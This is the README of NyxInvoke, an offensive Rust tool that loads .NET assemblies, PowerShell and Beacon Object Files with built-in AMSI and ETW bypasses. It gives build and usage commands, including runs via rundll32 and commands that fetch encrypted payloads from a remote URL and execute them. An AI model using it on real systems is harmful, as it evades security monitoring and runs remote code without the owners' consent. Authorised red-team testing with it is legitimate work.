# NyxInvoke

NyxInvoke is a versatile Rust-based tool designed for executing .NET assemblies, PowerShell commands/scripts, and Beacon Object Files (BOFs) with built-in patchless AMSI and ETW bypass capabilities. It can be compiled as either a standalone executable or a DLL.

## Features

- Execute .NET assemblies
- Run PowerShell commands or scripts
- Load and execute Beacon Object Files (BOFs)
- Built-in patchless AMSI (Anti-Malware Scan Interface) bypass
- Built-in patchless ETW (Event Tracing for Windows) bypass
- Support for encrypted payloads with AES decryption
- Flexible input options: local files, URLs, or compiled-in data
- Dual-build support: can be compiled as an executable or a DLL

## Building

NyxInvoke can be built as either an executable or a DLL. Use the following commands:

### Executable

```
cargo build --release --features exe
```

### DLL

```
cargo build --release --features dll
```

To include compiled-in CLR or BOF data, add the respective features:

```
cargo build --release --features "exe,compiled_clr,compiled_bof"
```
or
```
cargo build --release --features "dll,compiled_clr,compiled_bof"
```

## Usage

### Executable Mode

The executable supports three main modes of operation:

1. CLR Mode (.NET assembly execution)
2. PowerShell Mode
3. BOF Mode (Beacon Object File execution)

#### General Syntax

```
NyxInvoke.exe <mode> [OPTIONS]
```

Where `<mode>` is one of: `clr`, `ps`, or `bof`.

### DLL Mode

When compiled as a DLL, NyxInvoke can be executed using rundll32. The syntax is:

```
rundll32.exe NyxInvoke.dll,NyxInvoke <mode> [OPTIONS]
```

### Mode-Specific Options

1. CLR Mode:
```text
Execute a .NET assembly

Usage: NyxInvoke.exe clr [OPTIONS] (or rundll32.exe NyxInvoke.dll,NyxInvoke clr [OPTIONS])

Options:
      --args <ARGS>                          Arguments for the executable
      --base <BASE_URL_OR_PATH>              Base URL or Base Path
      --key <KEY_FILENAME_OR_URL>            Key filename or URL
      --iv <IV_FILENAME_OR_URL>              IV filename or URL
      --assembly <ASSEMBLY_FILENAME_OR_URL>  Assembly filename or URL
  -h, --help                                 Print help
```

2. PowerShell Mode:
```text
Execute a PowerShell command or script

Usage: NyxInvoke.exe ps [OPTIONS] (or rundll32.exe NyxInvoke.dll,NyxInvoke ps [OPTIONS])

Options:
      --command <COMMAND>  PowerShell command to execute
      --script <SCRIPT>    Path to a PowerShell script to execute
  -h, --help               Print help
```

3. BOF Mode:
```text
Execute a Beacon Object File (BOF)

Usage: NyxInvoke.exe bof [OPTIONS] (or rundll32.exe NyxInvoke.dll,NyxInvoke bof [OPTIONS])

Options:
      --args <ARGS>...             Arguments for the BOF
      --base <BASE_URL_OR_PATH>    Base URL or Base Path
      --key <KEY_FILENAME_OR_URL>  Key filename or URL
      --iv <IV_FILENAME_OR_URL>    IV filename or URL
      --bof <BOF_FILENAME_OR_URL>  BOF filename or URL
  -h, --help                       Print help
```

## Examples

### Executable Mode

1. CLR Mode (Remote Execution):
   ```
   NyxInvoke.exe clr --base https://example.com/resources --key clr_aes.key --iv clr_aes.iv --assembly clr_data.enc --args arg1 arg2
   ```

2. PowerShell Mode (Script Execution):
   ```
   NyxInvoke.exe ps --script C:\path\to\script.ps1
   ```

3. BOF Mode (Local Execution):
   ```
   NyxInvoke.exe bof --key C:\path\to\bof_aes.key --iv C:\path\to\bof_aes.iv --bof C:\path\to\bof_data.enc --args "str=argument1" "int=42"
   ```

### DLL Mode

1. CLR Mode (Remote Execution):
   ```
   rundll32.exe NyxInvoke.dll,NyxInvoke clr --base https://example.com/resources --key clr_aes.key --iv clr_aes.iv --assembly clr_data.enc --args arg1 arg2
   ```

2. PowerShell Mode (Direct Command Execution):
   ```
   rundll32.exe NyxInvoke.dll,NyxInvoke ps --command "Get-Process | Select-Object Name, ID"
   ```

3. BOF Mode (Compiled Execution):
   ```
   rundll32.exe NyxInvoke.dll,NyxInvoke bof --args "str=argument1" "int=42"
   ```


## Test Resources

In the `resources` directory, you'll find several files to test NyxInvoke's functionality:

1. Encrypted CLR Assembly (Seatbelt):
   - File: `clr_data.enc`
   - Description: An encrypted version of the Seatbelt tool, a C# project for gathering system information.
   - Usage example:
     ```
     NyxInvoke.exe clr --key resources/clr_aes.key --iv resources/clr_aes.iv --assembly resources/clr_data.enc --args AntiVirus
     ```

2. Encrypted BOF (Directory Listing):
   - File: `bof_data.enc`
   - Description: An encrypted Beacon Object File that List user permissions for the specified file, wildcards supported.
   - Usage example:
     ```
     NyxInvoke.exe bof --key resources/bof_aes.key --iv resources/bof_aes.iv --bof resources/bof_data.enc --args "wstr=C:\Windows\system32\cmd.exe"
     ```

## Screenshot

- Remote CLR Executaion 

![Screenshot 2024-09-17 164409](https://github.com/user-attachments/assets/ba9b9200-226b-4179-a442-558be35b1dd9)

- Compiled CLR Executaion 

![Screenshot 2024-09-17 164446](https://github.com/user-attachments/assets/956d0a70-42cf-443c-8302-9cae967d7624)

- Local BOF Executaion 

![Screenshot 2024-09-17 174657](https://github.com/user-attachments/assets/5cf116d7-ff32-4f1a-be42-00ca4e4755ee)



- Compiled BOF Executaion 

![Screenshot 2024-09-17 174102](https://github.com/user-attachments/assets/33c51e4e-9ce9-4c5b-9883-743add95f925)


- Powershell Command Executaion 

![Screenshot 2024-09-17 171636](https://github.com/user-attachments/assets/296bedfd-4bb9-4905-8391-c456fc591fe3)

- Powershell Script Executaion 

![Screenshot 2024-09-17 172028](https://github.com/user-attachments/assets/d055cb24-c8f0-4df7-b358-12a061f33c50)




## Legal Notice

This tool is for educational and authorized testing purposes only. Ensure you have proper permissions before use in any environment.

## Credits

- @yamakadi for the [clroxide](https://github.com/yamakadi/clroxide) project
- @hakaioffsec for the [coffee](https://github.com/hakaioffsec/coffee) project